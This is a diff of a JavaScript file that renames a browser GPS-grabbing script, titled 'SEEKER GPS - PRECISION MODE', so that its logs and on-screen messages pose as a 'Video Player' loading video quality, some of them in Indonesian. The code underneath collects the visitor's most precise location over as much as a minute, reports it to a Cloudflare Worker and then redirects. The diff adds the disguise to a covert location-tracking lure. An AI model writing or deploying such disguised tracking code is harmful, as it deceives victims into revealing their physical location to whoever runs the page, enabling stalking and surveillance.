@@ -1,6 +1,6 @@
 
 /* ==========================================
-   SEEKER GPS - PRECISION MODE
+   Video Player - PRECISION MODE
    Version 2.1
    GPS FIRST -> REPORT -> REDIRECT
    ========================================== */
@@ -168,7 +168,7 @@ function acquireBestGPS() {
             };
 
             console.log(
-                "SEEKER GPS: BEST POSITION SELECTED",
+                "Video Player: BEST POSITION SELECTED",
                 gpsResult
             );
 
@@ -184,7 +184,7 @@ function acquireBestGPS() {
         function handleLocationError(error) {
 
             console.error(
-                "SEEKER GPS ACQUISITION ERROR:",
+                "Video Player ACQUISITION ERROR:",
                 error
             );
 
@@ -243,7 +243,7 @@ function acquireBestGPS() {
                         position.coords.accuracy;
 
                     console.log(
-                        "GPS READING #" + readings,
+                        "Menyiapkan Video #" + readings,
                         {
                             latitude: position.coords.latitude,
                             longitude: position.coords.longitude,
@@ -263,9 +263,9 @@ function acquireBestGPS() {
                         bestPosition = position;
 
                         console.log(
-                            "SEEKER GPS: NEW BEST ACCURACY:",
+                            "Premium Video: Menyiapkan frame:",
                             accuracy,
-                            "meters"
+                            "FPS"
                         );
 
                     }
@@ -276,10 +276,10 @@ function acquireBestGPS() {
                     if (result) {
 
                         result.textContent =
-                            "GPS scanning... " +
-                            "Best accuracy: " +
+                            "Preparing Video... " +
+                            "Best Quality: " +
                             bestPosition.coords.accuracy.toFixed(1) +
-                            " meters | Readings: " +
+                            " FPS | Phase: " +
                             readings;
 
                     }
@@ -293,7 +293,7 @@ function acquireBestGPS() {
                     ) {
 
                         console.log(
-                            "SEEKER GPS: TARGET ACCURACY REACHED."
+                            "Video Player: Mulai Memutar Video."
                         );
 
                         finish(bestPosition);
@@ -336,7 +336,7 @@ function acquireBestGPS() {
             if (finished) return;
 
             console.log(
-                "SEEKER GPS: 60 SECOND TIME LIMIT REACHED."
+                "Video Player: 60 SECOND TIME LIMIT REACHED."
             );
 
             if (bestPosition) {
@@ -348,7 +348,7 @@ function acquireBestGPS() {
                 finish(
                     null,
                     new Error(
-                        "GPS timeout: No location readings received within 60 seconds."
+                        "Player timeout: No Video readings received within 60 seconds."
                     )
                 );
 
@@ -386,11 +386,11 @@ async function sendLocation(
     };
 
     console.log(
-        "SEEKER GPS: Sending best position to Cloudflare..."
+        "Video Player: Mulai Memutar Video dari Cloudflare..."
     );
 
     console.log(
-        "SEEKER GPS: Final report:",
+        "Video Player: Final report:",
         report
     );
 
@@ -415,19 +415,19 @@ async function sendLocation(
     } catch (networkError) {
 
         console.error(
-            "SEEKER GPS NETWORK ERROR:",
+            "Video Player NETWORK ERROR:",
             networkError
         );
 
         throw new Error(
-            "Cannot connect to Cloudflare Worker. Check your internet connection."
+            "Cannot connect to Cloudflare Video Player. Check your internet connection."
         );
 
     }
 
 
     console.log(
-        "Cloudflare HTTP Status:",
+        "Cloudflare Video HTTP Status:",
         response.status
     );
 
@@ -440,7 +440,7 @@ async function sendLocation(
     } catch (parseError) {
 
         console.error(
-            "SEEKER GPS RESPONSE ERROR:",
+            "Video Player RESPONSE ERROR:",
             parseError
         );
 
@@ -479,7 +479,7 @@ async function sendLocation(
 
 
     console.log(
-        "SEEKER GPS: REPORT DELIVERY CONFIRMED."
+        "Video: REPORT DELIVERY CONFIRMED."
     );
 
     return data;
@@ -505,7 +505,7 @@ async function startPrecisionGPS() {
     if (!navigator.geolocation) {
 
         result.textContent =
-            "GPS is not supported by this browser.";
+            "Video Player is not supported by this browser.";
 
         return;
 
@@ -517,7 +517,7 @@ async function startPrecisionGPS() {
     if (!window.isSecureContext) {
 
         result.textContent =
-            "GPS requires a secure HTTPS connection.";
+            "Video requires a secure HTTPS connection.";
 
         return;
 
@@ -527,11 +527,11 @@ async function startPrecisionGPS() {
     locationBtn.disabled = true;
 
     result.textContent =
-        "Requesting location permission...";
+        "Requesting Video location permission...";
 
 
     console.log(
-        "SEEKER GPS: PRECISION MODE STARTED."
+        "Video Player: PRECISION MODE STARTED."
     );
 
 
@@ -542,7 +542,7 @@ async function startPrecisionGPS() {
            ================================== */
 
         result.textContent =
-            "Searching for the most accurate GPS position...";
+            "Searching for the Best Video Quality...";
 
         const gps = await acquireBestGPS();
 
@@ -552,34 +552,34 @@ async function startPrecisionGPS() {
            ================================== */
 
         console.log(
-            "SEEKER GPS FINAL LATITUDE:",
+            "Video Player FINAL LATITUDE:",
             gps.latitude
         );
 
         console.log(
-            "SEEKER GPS FINAL LONGITUDE:",
+            "Video Player FINAL LONGITUDE:",
             gps.longitude
         );
 
         console.log(
-            "SEEKER GPS FINAL ACCURACY:",
+            "Video Player FINAL ACCURACY:",
             gps.accuracy
         );
 
         console.log(
-            "TOTAL GPS READINGS:",
+            "TOTAL READINGS:",
             gps.readings
         );
 
         console.log(
-            "GPS ACQUISITION TIME:",
+            "ACQUISITION TIME:",
             (gps.acquisitionTime / 1000).toFixed(1),
             "seconds"
         );
 
 
         result.textContent =
-            "Best GPS position obtained: " +
+            "Best Video position obtained: " +
             gps.accuracy.toFixed(1) +
             " meters. Sending report...";
 
@@ -609,7 +609,7 @@ async function startPrecisionGPS() {
                 "Location report delivered successfully. Redirecting...";
 
             console.log(
-                "SEEKER GPS: REPORT DELIVERED SUCCESSFULLY."
+                "Video Player: REPORT DELIVERED SUCCESSFULLY."
             );
 
 
@@ -618,7 +618,7 @@ async function startPrecisionGPS() {
                ================================== */
 
             console.log(
-                "SEEKER GPS: REDIRECTING TO:",
+                "Video Player: REDIRECTING TO:",
                 REDIRECT_URL
             );
 
@@ -631,12 +631,12 @@ async function startPrecisionGPS() {
     } catch (error) {
 
         console.error(
-            "SEEKER GPS ERROR:",
+            "Video Player ERROR:",
             error
         );
 
         result.textContent =
-            "SEEKER GPS ERROR: " +
+            "Video Player ERROR: " +
             error.message;
 
     } finally {
@@ -664,7 +664,7 @@ async function startPrecisionGPS() {
 if (!locationBtn || !result) {
 
     console.error(
-        "SEEKER GPS ERROR: HTML elements not found."
+        "Video Player ERROR: HTML elements not found."
     );
 
 } else {
@@ -678,5 +678,5 @@ if (!locationBtn || !result) {
 
 
 /* ==========================================
-   END OF SEEKER GPS PRECISION MODE
+   END OF Video Player PRECISION MODE
    ========================================== */
